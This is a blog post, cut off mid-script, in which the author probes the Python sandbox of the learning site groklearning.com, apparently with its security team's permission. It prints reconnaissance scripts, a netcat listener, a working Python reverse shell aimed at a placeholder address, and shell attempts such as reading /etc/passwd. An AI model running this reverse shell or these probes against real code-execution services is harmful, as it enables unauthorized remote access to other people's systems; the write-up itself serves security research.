<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN"
  "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-1.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" version="XHTML+RDFa 1.0" dir="ltr"
  xmlns:content="http://purl.org/rss/1.0/modules/content/"
  xmlns:dc="http://purl.org/dc/terms/"
  xmlns:foaf="http://xmlns.com/foaf/0.1/"
  xmlns:og="http://ogp.me/ns#"
  xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
  xmlns:sioc="http://rdfs.org/sioc/ns#"
  xmlns:sioct="http://rdfs.org/sioc/types#"
  xmlns:skos="http://www.w3.org/2004/02/skos/core#"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema#">

<head profile="http://www.w3.org/1999/xhtml/vocab">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta about="/node/109" property="sioc:num_replies" content="2" datatype="xsd:integer" />
<link rel="shortcut icon" href="http://unix-heaven.org/misc/favicon.ico" type="image/vnd.microsoft.icon" />
<meta content="How I managed to get shell access to groklearning.com" about="/node/109" property="dc:title" />
<link rel="shortlink" href="/node/109" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
<link rel="canonical" href="/node/109" />
  <title>How I managed to get shell access to groklearning.com | unix-heaven.org</title>
  <style type="text/css" media="all">@import url("http://unix-heaven.org/modules/system/system.base.css?n1ykje");
@import url("http://unix-heaven.org/modules/system/system.menus.css?n1ykje");
@import url("http://unix-heaven.org/modules/system/system.messages.css?n1ykje");
@import url("http://unix-heaven.org/modules/system/system.theme.css?n1ykje");</style>
<style type="text/css" media="all">@import url("http://unix-heaven.org/modules/book/book.css?n1ykje");
@import url("http://unix-heaven.org/modules/comment/comment.css?n1ykje");
@import url("http://unix-heaven.org/modules/field/theme/field.css?n1ykje");
@import url("http://unix-heaven.org/modules/node/node.css?n1ykje");
@import url("http://unix-heaven.org/modules/search/search.css?n1ykje");
@import url("http://unix-heaven.org/modules/user/user.css?n1ykje");</style>
<style type="text/css" media="all">@import url("http://unix-heaven.org/sites/all/modules/colorbox/styles/default/colorbox_style.css?n1ykje");
@import url("http://unix-heaven.org/sites/all/modules/geshifilter/geshifilter.css?n1ykje");</style>
<style type="text/css" media="all">@import url("http://unix-heaven.org/themes/bartik/css/layout.css?n1ykje");
@import url("http://unix-heaven.org/themes/bartik/css/style.css?n1ykje");
@import url("http://unix-heaven.org/themes/bartik/css/colors.css?n1ykje");</style>
<style type="text/css" media="print">@import url("http://unix-heaven.org/themes/bartik/css/print.css?n1ykje");</style>

<!--[if lte IE 7]>
<link type="text/css" rel="stylesheet" href="http://unix-heaven.org/themes/bartik/css/ie.css?n1ykje" media="all" />
<![endif]-->

<!--[if IE 6]>
<link type="text/css" rel="stylesheet" href="http://unix-heaven.org/themes/bartik/css/ie6.css?n1ykje" media="all" />
<![endif]-->
  <script type="text/javascript" src="http://unix-heaven.org/misc/jquery.js?v=1.4.4"></script>
<script type="text/javascript" src="http://unix-heaven.org/misc/jquery.once.js?v=1.2"></script>
<script type="text/javascript" src="http://unix-heaven.org/misc/drupal.js?n1ykje"></script>
<script type="text/javascript" src="http://unix-heaven.org/sites/all/libraries/colorbox/jquery.colorbox-min.js?n1ykje"></script>
<script type="text/javascript" src="http://unix-heaven.org/sites/all/modules/colorbox/js/colorbox.js?n1ykje"></script>
<script type="text/javascript" src="http://unix-heaven.org/sites/all/modules/colorbox/styles/default/colorbox_style.js?n1ykje"></script>
<script type="text/javascript">
<!--//--><![CDATA[//><!--
jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"QbqsGlZ97K9gNHyaJIJHxm_vax1u2ybg5sYPM47kus8","js":{"misc\/jquery.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/colorbox\/jquery.colorbox-min.js":1,"sites\/all\/modules\/colorbox\/js\/colorbox.js":1,"sites\/all\/modules\/colorbox\/styles\/default\/colorbox_style.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/book\/book.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/colorbox\/styles\/default\/colorbox_style.css":1,"sites\/all\/modules\/geshifilter\/geshifilter.css":1,"themes\/bartik\/css\/layout.css":1,"themes\/bartik\/css\/style.css":1,"themes\/bartik\/css\/colors.css":1,"themes\/bartik\/css\/print.css":1,"themes\/bartik\/css\/ie.css":1,"themes\/bartik\/css\/ie6.css":1}},"colorbox":{"opacity":"0.85","current":"{current} of {total}","previous":"\u00ab Prev","next":"Next \u00bb","close":"Close","maxWidth":"98%","maxHeight":"98%","fixed":true,"mobiledetect":true,"mobiledevicewidth":"480px"}});
//--><!]]>
</script>
</head>
<body class="html not-front not-logged-in one-sidebar sidebar-first page-node page-node- page-node-109 node-type-article" >
  <div id="skip-link">
    <a href="#main-content" class="element-invisible element-focusable">Skip to main content</a>
  </div>
    <div id="page-wrapper"><div id="page">

  <div id="header" class="without-secondary-menu"><div class="section clearfix">

    
          <div id="name-and-slogan">

                              <div id="site-name">
              <strong>
                <a href="/" title="Home" rel="home"><span>unix-heaven.org</span></a>
              </strong>
            </div>
                  
                  <div id="site-slogan">
            Spread the Knowledge!          </div>
        
      </div> <!-- /#name-and-slogan -->
    
      <div class="region region-header">
    <div id="block-search-form" class="block block-search">

    
  <div class="content">
    <form action="/node/109" method="post" id="search-block-form" accept-charset="UTF-8"><div><div class="container-inline">
      <h2 class="element-invisible">Search form</h2>
    <div class="form-item form-type-textfield form-item-search-block-form">
  <label class="element-invisible" for="edit-search-block-form--2">Search </label>
 <input title="Enter the terms you wish to search for." type="text" id="edit-search-block-form--2" name="search_block_form" value="" size="15" maxlength="128" class="form-text" />
</div>
<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="Search" class="form-submit" /></div><input type="hidden" name="form_build_id" value="form-VL4cqByPgH5NEkzCAUj-m8ookomk_w0U5zSx8Uv4ykw" />
<input type="hidden" name="form_id" value="search_block_form" />
</div>
</div></form>  </div>
</div>
  </div>

          <div id="main-menu" class="navigation">
        <h2 class="element-invisible">Main menu</h2><ul id="main-menu-links" class="links clearfix"><li class="menu-218 first"><a href="/">Home</a></li>
<li class="menu-485 last"><a href="/about">About</a></li>
</ul>      </div> <!-- /#main-menu -->
    
    
  </div></div> <!-- /.section, /#header -->

  
  
  <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix">

          <div id="breadcrumb"><h2 class="element-invisible">You are here</h2><div class="breadcrumb"><a href="/">Home</a></div></div>
    
          <div id="sidebar-first" class="column sidebar"><div class="section">
          <div class="region region-sidebar-first">
    <div id="block-menu-block-1" class="block block-menu-block">

    <h2>Topics</h2>
  
  <div class="content">
    <div class="menu-block-wrapper menu-block-1 menu-name-menu-taxonomy parent-mlid-0 menu-level-1">
  <ul class="menu clearfix"><li class="first leaf menu-mlid-454"><a href="/taxonomy/term/4" title="Apache (14)">Apache (14)</a></li>
<li class="leaf menu-mlid-455"><a href="/taxonomy/term/2" title="BSD (95)">BSD (95)</a></li>
<li class="leaf menu-mlid-456"><a href="/taxonomy/term/10" title="C (6)">C (6)</a></li>
<li class="leaf menu-mlid-457"><a href="/taxonomy/term/8" title="CFEngine (17)">CFEngine (17)</a></li>
<li class="leaf menu-mlid-458"><a href="/taxonomy/term/18" title="DansGuardian (3)">DansGuardian (3)</a></li>
<li class="leaf menu-mlid-459"><a href="/taxonomy/term/6" title="FTP (1)">FTP (1)</a></li>
<li class="leaf menu-mlid-462"><a href="/taxonomy/term/1" title="GNU/Linux (68)">GNU/Linux (68)</a></li>
<li class="leaf menu-mlid-463"><a href="/taxonomy/term/12" title="GPT (5)">GPT (5)</a></li>
<li class="leaf menu-mlid-460"><a href="/taxonomy/term/14" title="Gerrit (3)">Gerrit (3)</a></li>
<li class="leaf menu-mlid-461"><a href="/taxonomy/term/13" title="Git (6)">Git (6)</a></li>
<li class="leaf menu-mlid-464"><a href="/taxonomy/term/7" title="Jenkins (8)">Jenkins (8)</a></li>
<li class="leaf menu-mlid-465"><a href="/taxonomy/term/20" title="Monitoring (24)">Monitoring (24)</a></li>
<li class="leaf menu-mlid-466"><a href="/taxonomy/term/3" title="MySQL (4)">MySQL (4)</a></li>
<li class="leaf menu-mlid-467"><a href="/taxonomy/term/19" title="Postfix (1)">Postfix (1)</a></li>
<li class="leaf menu-mlid-468"><a href="/taxonomy/term/11" title="Python (19)">Python (19)</a></li>
<li class="leaf menu-mlid-469"><a href="/taxonomy/term/17" title="Squid (3)">Squid (3)</a></li>
<li class="leaf menu-mlid-470"><a href="/taxonomy/term/9" title="Tinderbox (2)">Tinderbox (2)</a></li>
<li class="leaf menu-mlid-472"><a href="/taxonomy/term/15" title="VPN (9)">VPN (9)</a></li>
<li class="last leaf menu-mlid-471"><a href="/taxonomy/term/21" title="Virtualization (21)">Virtualization (21)</a></li>
</ul></div>
  </div>
</div>
  </div>
      </div></div> <!-- /.section, /#sidebar-first -->
    
    <div id="content" class="column"><div class="section">
            <a id="main-content"></a>
                    <h1 class="title" id="page-title">
          How I managed to get shell access to groklearning.com        </h1>
                          <div class="tabs">
                  </div>
                          <div class="region region-content">
    <div id="block-system-main" class="block block-system">

    
  <div class="content">
    <div id="node-109" class="node node-article node-promoted node-full clearfix" about="/node/109" typeof="sioc:Item foaf:Document">

      
      <div class="meta submitted">
            <span property="dc:date dc:created" content="2014-03-05T16:45:49+02:00" datatype="xsd:dateTime" rel="sioc:has_creator">Submitted by <span class="username" xml:lang="" about="/user/1" typeof="sioc:UserAccount" property="foaf:name" datatype="">dnaeon</span> on Wed, 03/05/2014 - 16:45</span>    </div>
  
  <div class="content clearfix">
    <div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p><a href="http://groklearning.com">groklearning.com</a> provides a platform for online education where one can learn how to program in <a href="http://python.org">Python</a>.</p>

<p>It is one of these projects that make the world better by providing online &amp; free education to people. If you are new to programming and want to learn some
Python, I'd suggest you visit <a href="http://groklearning.com">groklearning.com</a> site and take some (why not all) of the courses they have!</p>

<p>I've been using groklearning.com myself and have been telling friends about it who wish to learn Python, but don't know where to start from.</p>

<p>Using groklearning.com you can write your Python script, which in turn is executed and result is displayed back to the user. This is very cool, because you don't have to bring Python with you all the time and simply use it from your browser, but this also comes with a risk...</p>

<p>What if someone manages to make the system serve a different purpose..? What if someone manages to turn this into a weapon..?</p>

<p>In this post we are going to explore the security of groklearning.com by trying to get shell access to the systems.</p>

<p><em>DISCLAIMER: The information provided here is for educational purposes only! Any unauthorized attempts to use this information for malicious acts may be disclosed to law enforcement authorities and result in criminal prosecution!</em></p>

<p>This post was published with the permission and agreement of the <a href="https://groklearning.com/security/">Security Team at groklearning.com</a>.</p>

<h2>Choosing our target</h2>

<p>First thing I did is to choose a target. I've chosen the <a href="https://groklearning.com/csedweek/hoc-eliza/">Eliza course</a> and continued from there.</p>

<p>NOTE: Any other course would also work as long as it provides you with a window where you could write your Python script.</p>

<h2>Checking active processes</h2>

<p>The first Python script I've ran was to get a list of all active processes on the system. This would later allow me to identify any weak spots that I could use for my attack.</p>

<p>This is the script I've used:</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">subprocess</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">p <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">subprocess</span>.<span style="color: black;">Popen</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><span style="color: #483d8b;">'/bin/ps'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'-ef'</span><span style="color: black;">&#93;</span><span style="color: #66cc66;">,</span> stdout<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: #66cc66;">,</span> stderr<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stdout</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stderr</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>From the output of the above script I was able to identify a number of things about the system, such as OS, Virtualization technology being used, etc..</p>

<h2>Having a look around</h2>

<p>It was time to have a look around and see what we've got on this system. I've started checking what's in <code>/bin</code>, <code>/usr/bin</code>, and other directories in order to
identify anything that could be used as a weapon.</p>

<p>The system running my Python script was stripped down a bit, so you won't find all the UNIX/Linux tools you usually find on a default installation of a GNU/Linux system for example.</p>

<p>I've used this script to get what's in the different directories.</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">subprocess</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">p <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">subprocess</span>.<span style="color: black;">Popen</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><span style="color: #483d8b;">'/bin/ls'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'-la'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'/bin'</span><span style="color: black;">&#93;</span><span style="color: #66cc66;">,</span> stdout<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: #66cc66;">,</span> stderr<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stdout</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stderr</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>Okay, first thing noticed was that <code>/bin/bash</code> was there... Thought I'd give it try and see if I could start it...</p>

<p>I've quickly loaded my next Python script and executed it:</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">subprocess</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">p <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">subprocess</span>.<span style="color: black;">Popen</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><span style="color: #483d8b;">'/bin/bash'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'--version'</span><span style="color: black;">&#93;</span><span style="color: #66cc66;">,</span> stdout<span style="color: #66cc66;">=</span><span style="color: #dc143c;">subprocess</span>.<span style="color: black;">PIPE</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>p.<span style="color: black;">stdout</span>.<span style="color: black;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>I wasn't really hoping much for anything to happen, but then I got result back which was:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">GNU bash, version 4.2.37(1)-release (i686-pc-linux-gnu)</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Copyright (C) 2011 Free Software Foundation, Inc.</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">This is free software; you are free to change and redistribute it.</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">There is NO WARRANTY, to the extent permitted by law.</div></li>
</ol></div></div>

<p>Okay, now I knew I could start a shell on the remote system, but I couldn't do much with it... at least for now...</p>

<h2>Is outbound traffic allowed?</h2>

<p>Time to check if outbound traffic is allowed. If outbound traffic was allowed I could write up a Python script which would spawn a reverse shell for me and grant me access.. Only if outbound traffic is allowed..</p>

<p>So, I've used this script to verify that outbound HTTP traffic is allowed.</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">socket</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp; </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">socket</span>.<span style="color: #dc143c;">socket</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">socket</span>.<span style="color: black;">AF_INET</span><span style="color: #66cc66;">,</span> <span style="color: #dc143c;">socket</span>.<span style="color: black;">SOCK_STREAM</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">connect</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">&quot;www.python.org&quot;</span> <span style="color: #66cc66;">,</span> <span style="color: #ff4500;">80</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">sendall</span><span style="color: black;">&#40;</span>b<span style="color: #483d8b;">&quot;GET http://www.python.org HTTP/1.0<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">print</span><span style="color: black;">&#40;</span>s.<span style="color: black;">recv</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">4096</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>I've loaded this script in <em>Eliza</em> and hit the <em>run</em> button. And the result was:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">HTTP/1.1 404 Not found</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Server: Varnish</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Retry-After: 0</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">content-type: text/html</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Content-Length: 77</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Accept-Ranges: bytes</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Date: Tue, 04 Mar 2014 18:13:57 GMT</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Via: 1.1 varnish</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">Connection: close</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&lt;html&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&lt;head&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&lt;title&gt; &lt;/title&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&lt;/head&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&lt;body&gt;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">unknown domain: &lt;/body&gt;&lt;/html&gt;</div></li>
</ol></div></div>

<p>The result from the script confirmed that outbound HTTP traffic is allowed, so I was ready to launch my first attack.</p>

<h2>Launching the attack</h2>

<p>I've created a listener on my machine on port 80 using netcat which I would later use for my reverse shell:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"># nc -l -p 80</div></li>
</ol></div></div>

<p>Next thing I had to do is load a reverse shell script in Python to groklearning.com. This the script I've used for my Python reserve shell:</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">socket</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">subprocess</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">os</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">socket</span>.<span style="color: #dc143c;">socket</span><span style="color: black;">&#40;</span><span style="color: #dc143c;">socket</span>.<span style="color: black;">AF_INET</span><span style="color: #66cc66;">,</span> <span style="color: #dc143c;">socket</span>.<span style="color: black;">SOCK_STREAM</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">connect</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">'x.x.x.x'</span><span style="color: #66cc66;">,</span> <span style="color: #ff4500;">80</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">s.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">0</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">1</span><span style="color: black;">&#41;</span> </div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #dc143c;">os</span>.<span style="color: black;">dup2</span><span style="color: black;">&#40;</span>s.<span style="color: black;">fileno</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">,</span><span style="color: #ff4500;">2</span><span style="color: black;">&#41;</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">p <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">subprocess</span>.<span style="color: black;">call</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><span style="color: #483d8b;">'/bin/sh'</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'-i'</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span></div></li>
</ol></div></div>

<p>As soon as I fired up the Python reverse shell I was able to see the shell prompt on my netcat listener:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"># nc -l 80</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$</div></li>
</ol></div></div>

<p>Then I tried executing some shell commands:</p>

<div class="geshifilter"><div class="text geshifilter-text" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$ ls</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">/bin/sh: 1: Cannot fork</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$ pwd</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">/tmp/tmphBjnv5</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$ cat /etc/passwd</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">/bin/sh: 3: Cannot fork</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$ uname -a</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">/bin/sh: 4: Cannot fork</div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">$ ^D</div></li>
</ol></div></div>

<p>Unfortunately, I wasn't able to do much with my reverse shell, as it seems there were some limits in place, so I went further into checking things on the target machine.</p>

<h2>Checking our limits</h2>

<p>Next thing I did is to check the limits on the target system. I've used the following Python script to check our limits:</p>

<div class="geshifilter"><div class="python geshifilter-python" style="font-family:monospace;"><ol><li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal"><span style="color: #ff7700;font-weight:bold;">import</span> <span style="color: #dc143c;">subprocess</span></div></li>
<li style="font-family: monospace; font-weight: normal;"><div style="font-family: monospace; font-weight: normal; font-style: normal">&nbsp;</div></li>
